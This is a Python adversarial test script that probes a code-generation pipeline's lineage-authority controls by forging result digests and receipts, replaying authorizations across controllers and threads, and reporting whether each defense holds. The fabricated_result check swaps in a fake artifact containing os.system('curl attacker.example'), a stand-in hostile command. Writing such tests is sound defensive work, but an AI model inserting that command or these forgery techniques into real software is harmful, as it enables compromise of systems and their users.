#!/usr/bin/env python3
"""Read-only post-correction C2R6C-A ownership diagnostic."""
from __future__ import annotations

from dataclasses import replace
import hashlib
import inspect
import json
import sys
import threading
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
for rel in (
    "runtime/R0/src",
    "components/TRMFractalSpine/src",
    "components/Grid81DeterministicStructuralAdjudicator/src",
    "components/Grid81StructuralSemantics/src",
    "components/Pipeline/P0ControlProtocol/src",
    "components",
    "src",
):
    sys.path.insert(0, str(REPO / rel))

import elpis_p0.lineage_authority as authority_module
from elpis_p0.artifact_lineage import _result_payload
from elpis_p0.canonical import digest
from elpis_p0.contracts import ArtifactCandidate, RequestContext
from elpis_p0.controller import P0Controller
from elpis_p0.factory import build_default_controller
from elpis_p0.lineage_authority import (
    P0AuthorizedArtifactLineageV1,
    P0LineageAuthorityError,
    P0LineageAuthorityReceiptV1,
    RECEIPT_DOMAIN,
)

FINDINGS = []
EXPLOITS = []


def record(check, status, detail):
    FINDINGS.append({"check": check, "status": status, "detail": detail})
    if status == "EXPLOIT":
        EXPLOITS.append(check)


class RejectingDecoder:
    def decode(self, context, plan):
        source = "def solution(:\n    return 1\n"
        return ArtifactCandidate(
            language="python",
            source=source,
            digest=digest({"plan_digest": plan.plan_digest, "source": source}),
        )


def ctx():
    return RequestContext(
        request_id="c2r6ca-redteam-corrected",
        prompt="write deterministic python and validate it",
        domain="python",
        entrypoint="solution",
        parameters=("x",),
    )


def rejected():
    controller = build_default_controller()
    controller.decoder = RejectingDecoder()
    result = controller.run(ctx())
    return controller, result


def dd(domain, payload):
    raw = json.dumps(
        payload,
        sort_keys=True,
        separators=(",", ":"),
        ensure_ascii=False,
        allow_nan=False,
    ).encode("utf-8")
    return hashlib.sha256(domain.encode("utf-8") + b"\x00" + raw).hexdigest()


def ownership_surface():
    injected = "lineage_authority" in inspect.signature(P0Controller).parameters
    public_issuer = hasattr(authority_module, "P0LineageAuthorityV1")
    public_verifier = hasattr(P0Controller, "lineage_authority_verifier")
    old_attr = hasattr(build_default_controller(), "_lineage_authority")
    record(
        "supported_ownership_surface_closed",
        "DEFENSE_HOLDS" if not any((injected, public_issuer, public_verifier, old_attr)) else "EXPLOIT",
        {
            "constructor_injection": injected,
            "public_standalone_issuer": public_issuer,
            "public_verifier_selector": public_verifier,
            "old_single_underscore_attribute": old_attr,
        },
    )


def fabricated_result():
    controller, real = rejected()
    evil_source = "import os\nos.system('curl attacker.example')\n"
    evil_artifact = ArtifactCandidate(
        language="python",
        source=evil_source,
        digest=digest({"plan_digest": real.decoder_plan.plan_digest, "source": evil_source}),
    )
    swapped = replace(real, artifact=evil_artifact)
    forged = replace(swapped, result_digest=digest(_result_payload(swapped)))
    rejected_flag = False
    error = None
    try:
        controller.authorized_artifact_lineage(forged, validator_index=0)
    except P0LineageAuthorityError as exc:
        rejected_flag = True
        error = str(exc)
    record(
        "fabricated_result_without_controller_precommit",
        "DEFENSE_HOLDS" if rejected_flag else "EXPLOIT",
        {"rejected": rejected_flag, "error": error},
    )


def distinct_controller():
    controller, result = rejected()
    authorized = controller.authorized_artifact_lineage(result, validator_index=0)
    other = build_default_controller()
    rejected_flag = False
    error = None
    try:
        other.consume_authorized_artifact_lineage(authorized)
    except P0LineageAuthorityError as exc:
        rejected_flag = True
        error = str(exc)
    record(
        "distinct_authority_instance_rejected",
        "DEFENSE_HOLDS" if rejected_flag else "EXPLOIT",
        {"rejected": rejected_flag, "error": error},
    )


def unissued_receipt():
    controller, result = rejected()
    authorized = controller.authorized_artifact_lineage(result, validator_index=0)
    base = {
        "authority_instance_id": authorized.receipt.authority_instance_id,
        "capability_id": "a" * 64,
        "issuance_sequence": 999,
        "lineage_digest": authorized.lineage.lineage_digest,
        "p0_result_digest": authorized.lineage.p0_result_digest,
        "request_id": authorized.lineage.request_id,
        "validator_evidence_digest": authorized.lineage.validator_evidence_digest,
        "validator_index": authorized.lineage.validator_index,
    }
    forged = P0AuthorizedArtifactLineageV1(
        lineage=authorized.lineage,
        receipt=P0LineageAuthorityReceiptV1(
            **base,
            receipt_digest=dd(RECEIPT_DOMAIN, base),
        ),
    )
    rejected_flag = False
    error = None
    try:
        controller.consume_authorized_artifact_lineage(forged)
    except P0LineageAuthorityError as exc:
        rejected_flag = True
        error = str(exc)
    record(
        "unissued_selfconsistent_receipt",
        "DEFENSE_HOLDS" if rejected_flag else "EXPLOIT",
        {"rejected": rejected_flag, "error": error},
    )


def concurrent_reveal():
    controller, result = rejected()
    barrier = threading.Barrier(16)
    successes = []
    errors = []

    def worker():
        barrier.wait()
        try:
            successes.append(controller.authorized_artifact_lineage(result, validator_index=0))
        except Exception as exc:
            errors.append(exc)

    threads = [threading.Thread(target=worker) for _ in range(16)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    untyped = [
        f"{type(exc).__name__}: {exc}"
        for exc in errors
        if not isinstance(exc, P0LineageAuthorityError)
    ]
    record(
        "concurrent_reveal_typed_one_shot",
        "DEFENSE_HOLDS" if len(successes) == 1 and len(errors) == 15 and not untyped else "EXPLOIT",
        {"successes": len(successes), "typed_rejections": len(errors) - len(untyped), "untyped": untyped},
    )


def concurrent_consume():
    controller, result = rejected()
    authorized = controller.authorized_artifact_lineage(result, validator_index=0)
    barrier = threading.Barrier(16)
    successes = []
    errors = []

    def worker():
        barrier.wait()
        try:
            successes.append(controller.consume_authorized_artifact_lineage(authorized))
        except Exception as exc:
            errors.append(exc)

    threads = [threading.Thread(target=worker) for _ in range(16)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    untyped = [
        f"{type(exc).__name__}: {exc}"
        for exc in errors
        if not isinstance(exc, P0LineageAuthorityError)
    ]
    record(
        "concurrent_consume_typed_one_shot",
        "DEFENSE_HOLDS" if len(successes) == 1 and len(errors) == 15 and not untyped else "EXPLOIT",
        {"successes": len(successes), "typed_rejections": len(errors) - len(untyped), "untyped": untyped},
    )


def domain_separator():
    source = (
        REPO / "components/Pipeline/P0ControlProtocol/src/elpis_p0/lineage_authority.py"
    ).read_text(encoding="utf-8")
    ok = 'b"\\x00"' in source and 'b"\\\\x00"' not in source
    record(
        "receipt_domain_separator_nul",
        "DEFENSE_HOLDS" if ok else "EXPLOIT",
        {"nul_convention": ok},
    )


def retention_observation(runs=25):
    controller, _ = rejected()
    authority = getattr(controller, "_P0Controller__lineage_authority")
    pending = getattr(authority, "_ControllerLineageAuthority__pending")
    before = len(pending)
    for _ in range(runs):
        result = controller.run(ctx())
        authorized = controller.authorized_artifact_lineage(result, validator_index=0)
        controller.consume_authorized_artifact_lineage(authorized)
    after = len(pending)
    record(
        "retention_growth",
        "OBSERVATION",
        {
            "runs": runs,
            "before": before,
            "after": after,
            "growth_per_rejecting_run": (after - before) / runs,
            "hostile_same_process_isolation_claimed": False,
        },
    )


def main():
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("--out", type=Path)
    parser.add_argument("--quiet", action="store_true")
    args = parser.parse_args()

    for check in (
        ownership_surface,
        fabricated_result,
        distinct_controller,
        unissued_receipt,
        concurrent_reveal,
        concurrent_consume,
        domain_separator,
        retention_observation,
    ):
        try:
            check()
        except Exception as exc:
            record(check.__name__, "HARNESS_ERROR", f"{type(exc).__name__}: {exc}")

    report = {
        "schema": "elpis.redteam-c2r6ca-lineage-authority-corrected.v2",
        "correction_base": "6454df559b35058786b1d2b87623ed22a10e6d42",
        "role": "READ_ONLY_ADVERSARIAL_DIAGNOSTIC",
        "findings": FINDINGS,
        "exploits": EXPLOITS,
        "exploit_count": len(EXPLOITS),
    }
    text = json.dumps(report, indent=2, sort_keys=True)
    if args.out:
        args.out.parent.mkdir(parents=True, exist_ok=True)
        args.out.write_text(text + "\n", encoding="utf-8")
    if not args.quiet:
        print(text)
    return 1 if EXPLOITS else 0


if __name__ == "__main__":
    raise SystemExit(main())
